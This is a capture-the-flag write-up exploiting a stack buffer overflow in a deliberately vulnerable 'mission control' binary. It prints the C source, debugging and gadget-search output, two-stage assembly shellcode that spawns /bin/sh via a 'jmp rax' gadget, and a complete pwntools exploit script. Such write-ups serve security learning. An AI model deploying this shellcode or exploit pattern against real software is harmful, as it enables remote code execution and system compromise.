# Mission Control Malfunction

## Reverse Engineering
We are given a [binary](https://github.com/chouettevan/CTF-writeups/blob/main/assets/cu2025/pwn/re) alongside with its source code:
```c
#include <stdio.h>
#include <stdlib.h>
#include <stdbool.h>
#define MAX_ENTRIES 10
#define NAME_LEN 32
#define MSG_LEN 64
typedef struct entry {
        char name[8];
        char msg[64];
} entry_t;
void print_menu() {
        puts("What mission operation would you like to perform?");
        puts("1. Add a new crew member");
        puts("2. Send a transmission to crew member");
        puts("3. Exit mission control");
}
int vuln() {
        char feedback[8];
        entry_t entries[10];
        int total_entries = 0;
        int choice = -1;
        // Have a menu that allows the user to write whatever they want to a set buffer elsewhere in memory
        while (true) {
                print_menu();
                if (scanf("%d", &choice) != 1) exit(0);
                getchar(); // Remove trailing \n
                // Add entry
                if (choice == 1) {
                        choice = -1;
                        // Check for max entries
                        if (total_entries >= MAX_ENTRIES) {
                                puts("Maximum crew capacity reached!");
                                continue;
                        }
                        // Add a new entry
                        puts("What's the new crew member's callsign: ");
                        fflush(stdin);
                        fgets(entries[total_entries].name, NAME_LEN, stdin);
                        total_entries++;
                }
                // Add message
                else if (choice == 2) {
                        choice = -1;
                        puts("Which crew member would you like to send a transmission to?");
                        if (scanf("%d", &choice) != 1) exit(0);
                        getchar();
                        if (choice >= total_entries) {
                                puts("Invalid crew member number");
                                continue;
                        }
                        puts("What transmission would you like to send them?");
                        fgets(entries[choice].msg, MSG_LEN, stdin);
                }
                else if (choice == 3) {
                        choice = -1;
                        puts("Thank you for using mission control! If you could take a second to write a quick mission report, we would really appreciate it: ");
                        fgets(feedback, NAME_LEN, stdin);
                        feedback[7] = '\0';
                        break;
                }
                else {
                        choice = -1;
                        puts("Invalid operation");
                }
        }
}
int main() {
        setvbuf(stdout, NULL, _IONBF, 0);  // No buffering (immediate output)
        vuln();
        return 0;
}
```
The bug is as follows: we are allowed to write 32 bytes in a buffer of 8 when leving a comment.

## Exploitation

There is no functionality to print the flag,meaning that we need to get a shell.
by using `pwn checksec` from pwntools, we see that the binary has no protections:
```
[*] 'handoff'
    Arch:       amd64-64-little
    RELRO:      Partial RELRO
    Stack:      No canary found
    NX:         NX unknown - GNU_STACK missing
    PIE:        No PIE (0x400000)
    Stack:      Executable
    RWX:        Has RWX segments
    SHSTK:      Enabled
    IBT:        Enabled
    Stripped:   No
    Debuginfo:  Yes
```
We could ROP, but it is easier to simply jump to shellcode.

### ASLR
The binary may not have PIE enabled, but ASLR is almost certainly enbled on the system.
We therefore need a ROP gadget that will jump to our shellocde.

By doing a bit of debugging,we notice that, when `vuln` returns,
rax points to our buffer
```
(gdb) b *vuln+534
Breakpoint 1 at 0x401453: file handoff.c, line 66.
(gdb) run
Starting program: /home/archstrike/Downloads/re

This GDB supports auto-downloading debuginfo from the following URLs:
  <https://debuginfod.archlinux.org>
Enable debuginfod for this session? (y or [n]) n]
Debuginfod has been disabled.
To make this setting permanent, add 'set debuginfod enabled off' to .gdbinit.
[Thread debugging using libthread_db enabled]
Using host libthread_db library "/usr/lib/libthread_db.so.1".
What mission operation would you like to perform?
1. Add a new crew member
2. Send a transmission to crew member
3. Exit mission control
3
Thank you for using mission control! If you could take a second to write a quick mission report, we would really appreciate it:
aaaaaaaa

Breakpoint 1, 0x0000000000401453 in vuln () at handoff.c:66
66	}
(gdb) i r rax
rax            0x7fffffffe6f4      140737488348916
(gdb) x/s $rax
0x7fffffffe6f4:	"aaaaaaa"
(gdb)
```

Returning to a `jmp rax` gadget would instantly jump to our
shellcode.let's see if one such gadget exists:

```sh
[I] ◆ Downloads ❯❯❯ ROPgadget --binary re | grep 'jmp rax'
0x0000000000401165 : je 0x401170 ; mov edi, 0x404048 ; jmp rax
0x00000000004011a7 : je 0x4011b0 ; mov edi, 0x404048 ; jmp rax
0x000000000040116c : jmp rax
0x0000000000401167 : mov edi, 0x404048 ; jmp rax
0x0000000000401166 : or dword ptr [rdi + 0x404048], edi ; jmp rax
0x0000000000401163 : test eax, eax ; je 0x401170 ; mov edi, 0x404048 ; jmp rax
0x00000000004011a5 : test eax, eax ; je 0x4011b0 ; mov edi, 0x404048 ; jmp rax
```

There effectively is such a gadget at `0x40116c`.


## Considerations

Let's quickly review the code that triggers the overflow:

```c
#define NAME_LEN 32
...
else if (choice == 3) {
    choice = -1;
    puts("Thank you for using mission control! If you could take a second to write a quick mission report, we would really appreciate it: ");
    fgets(feedback, NAME_LEN, stdin);
    feedback[7] = '\0';
    break;
}
```
We notice  2 things:
First, Since `NAME_LEN` is 32,we only have 32 bytes for our shellcode, from which 8 are `0x40116c` (the gadget's address)
Next, the 7th byte from our shellcode will be cleared before our exploit gets to run it.

## Exploitation
In order to bypass the 32 byte limit, I chose to break the 
shellcode into 2 stages: the first part loads the second one,
which runs free from any size restrictions.

stage 1 shellcode
```asssembly
.intel_syntax noprefix
nop
nop
lea rsi,[rip+binsh]
xor eax,eax
xor edi,edi
mov edx,0x1000
syscall
binsh:
```

The two nops at the beginning ensure that the 7th byte of the
shellcode is `0x00`, so that clearing it does'nt change anything.

The second stage just pops a shell

```assembly
.intel_syntax noprefix
lea rdi,[rip+binsh]
xor eax,eax
mov al,59
xor esi,esi
xor edx,edx
syscall
binsh:
.string "/bin/sh"
```

We then compile and extract the shellcode:
```bash
gcc -static -nostdlib stage1.s -o stage1
gcc -static -nostdlib stage2.s -o stage2
objcopy --dump-section .text=stage1.raw stage1
objcopy --dump-section .text=stage2.raw stage2
```

And execute the following exploit script:

```python
from pwn import *
context.terminal = ['alacritty','-e','bash','-c']
context.arch = 'amd64'

target = process('/home/archstrike/Downloads/re')
#target = remote('34.66.146.178',5664)
elf = ELF('/home/archstrike/Downloads/re')
jmp_rax = 0x40116c # address of our gadget
shellcode = b''
with open('stage1.raw','rb')as code:
    shellcode = code.read()
stage2 = b''
with open('stage2.raw','rb')as code:
    stage2 = code.read()

payload = b'3' # trigger the overflow
payload += shellcode # stage 1 payload
payload += b'a'*(0x10 + 0x8 + 0x4 - 7 - len(payload) + 1)
payload += p64(jmp_rax) 
print(payload)
#gdb.attach(target)
target.sendline(payload)
target.sendline(stage2)
target.interactive()
```



